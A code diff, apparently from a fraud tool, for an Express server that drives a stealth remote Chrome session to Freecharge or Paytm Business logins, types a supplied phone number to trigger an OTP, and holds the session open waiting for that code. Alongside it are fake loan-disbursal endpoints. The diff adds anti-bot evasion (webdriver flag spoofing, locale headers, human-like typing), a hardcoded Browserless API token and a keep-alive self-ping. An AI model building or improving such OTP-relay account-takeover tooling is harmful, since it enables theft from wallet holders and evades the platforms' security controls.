@@ -24,16 +24,15 @@ app.get('/next/micro/ca/approvals', (req, res) => res.json({ success: true, pend
 app.get('/next/micro/disbursal/disbursal', (req, res) => res.json({ success: true, balance: 0 }));
 
 // ==========================================
-// STEP 1: TRIGGER OTP VIA BROWSERLESS (FIXED)
+// STEP 1: TRIGGER OTP VIA BROWSERLESS (ULTRA STEALTH)
 // ==========================================
 app.post('/api/start-tool', async (req, res) => {
     const { phone, walletType } = req.body;
     if (!phone) return res.status(400).json({ success: false, message: "Phone required" });
 
-   // 🔴 BROWSERLESS KA ASLI JUGAAD (Stealth + Headless False) 🔴
-const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&stealth=true&headless=false&--disable-blink-features=AutomationControlled';
+    // 🔴 BROWSERLESS KA ASLI JUGAAD (Stealth + Headless False + Webdriver Disable) 🔴
+    const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&stealth=true&headless=false&--disable-blink-features=AutomationControlled';
 
-    // Pehle se koi session hai toh usko securely kill karo
     if (activeSessions[phone] && activeSessions[phone].browser) {
         try { await activeSessions[phone].browser.close(); } catch(e){}
     }
@@ -51,9 +50,6 @@ const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c5
 
         const page = await browser.newPage();
         await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36');
-        
-        // 🔥 FIX 2: Interception HATA di. Security bypass karne ke liye page poora load hona chahiye.
-        // await page.setRequestInterception(true); 
 
         activeSessions[phone].browser = browser;
         activeSessions[phone].page = page;
@@ -61,8 +57,6 @@ const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c5
         if (walletType.toLowerCase().includes('freecharge')) {
             console.log(`[!] Opening Freecharge for ${phone}...`);
             await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 60000 });
-            
-            // Wait for login button to actually appear before clicking
             await new Promise(r => setTimeout(r, 3000)); 
 
             await page.evaluate(() => {
@@ -74,40 +68,49 @@ const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c5
             await page.keyboard.type(phone, { delay: 50 });
             await page.keyboard.press('Enter');
 
-      } else {
-            console.log(`[!] Opening Paytm for ${phone}...`);
+        } else {
+            console.log(`[!] Opening Paytm Business for ${phone}...`);
             
-            // 🔥 FIX 1: networkidle2 lagaya taaki page poora theek se load ho
-            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'networkidle2', timeout: 60000 });
-            
-            await new Promise(r => setTimeout(r, 3000)); // Page render hone ka wait
+            // 🔥 ULTIMATE BYPASS: Indian IP aur Browser spoofing headers
+            await page.setExtraHTTPHeaders({
+                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8,hi;q=0.7',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1'
+            });
 
-            // 🔥 FIX 2: Check karo ki Paytm ne IP block toh nahi kar diya
+            // Webdriver flag ko destroy karna
+            await page.evaluateOnNewDocument(() => {
+                Object.defineProperty(navigator, 'webdriver', { get: () => false });
+            });
+
+            // Page load networkidle2 se karenge (Security script poori load hone do, block mat karo)
+            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'networkidle2', timeout: 60000 });
+            await new Promise(r => setTimeout(r, 3000)); 
+
             let pageText = await page.evaluate(() => document.body.innerText);
             if (pageText.toLowerCase().includes('server busy') || pageText.toLowerCase().includes('something went wrong')) {
-                console.log(`[!] PAYTM BLOCKED IP: Server Busy dikha raha hai!`);
+                console.log(`[!] PAYTM BLOCKED IP: Server Busy dikha raha hai! Retry kijiye!`);
                 throw new Error("Paytm Anti-Bot Block (Server Busy)");
             }
 
-            // 🔥 FIX 3: Dheere type karega taaki bot na lage
+            // Dheere type karo
             let inputField = await page.waitForSelector('input[type="tel"], input[name="mobileNumber"]', { timeout: 15000 });
             await inputField.focus(); 
             await inputField.type(phone, { delay: 150 }); 
 
-            // 🔥 FIX 4: Asli button dhoondh kar click karega, sirf Enter nahi dabayega
+            // Asli click karo
             await page.evaluate(() => {
                 const btns = Array.from(document.querySelectorAll('button'));
                 const proceedBtn = btns.find(b => b.innerText && (b.innerText.toLowerCase().includes('proceed') || b.innerText.toLowerCase().includes('login') || b.innerText.toLowerCase().includes('sign in')));
                 if (proceedBtn) proceedBtn.click();
             });
-            
-            // Backup ke liye Enter
             await page.keyboard.press('Enter');
         }
         
         console.log(`[!] OTP Triggered on Browserless for ${phone}`);
 
-        // 3 minute baad auto-kill
         setTimeout(async () => {
             if (activeSessions[phone] && activeSessions[phone].status === 'waiting_for_otp') {
                 try { await activeSessions[phone].browser.close(); delete activeSessions[phone]; } catch(e){}
@@ -117,7 +120,6 @@ const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c5
 
     } catch (e) {
         console.log(`[-] Browserless Error on ${phone}: ${e.message}`);
-        // 🔥 FIX 1: ERROR AANE PAR ZOMBIE BROWSER KO KILL KARNA ZAROORI HAI!
         if(activeSessions[phone]) {
             activeSessions[phone].status = 'failed';
             if (activeSessions[phone].browser) {
@@ -180,4 +182,14 @@ app.get('/api/check-status/:phone', (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => console.log(`🚀 API Server Running on Port ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 API Server Running on Port ${PORT}`);
+    
+    // 🔥 24/7 RENDER KEEP-ALIVE JUGAAD 🔥
+    // Yeh tere server ko kabhi sone nahi dega!
+    setInterval(() => {
+        // Self-ping to keep process active
+        axios.get(`http://localhost:${PORT}/`).catch(() => {});
+        console.log("[+] 24/7 Keep-Alive Auto-Ping Sent!");
+    }, 5 * 60 * 1000); // Har 5 minute mein
+});
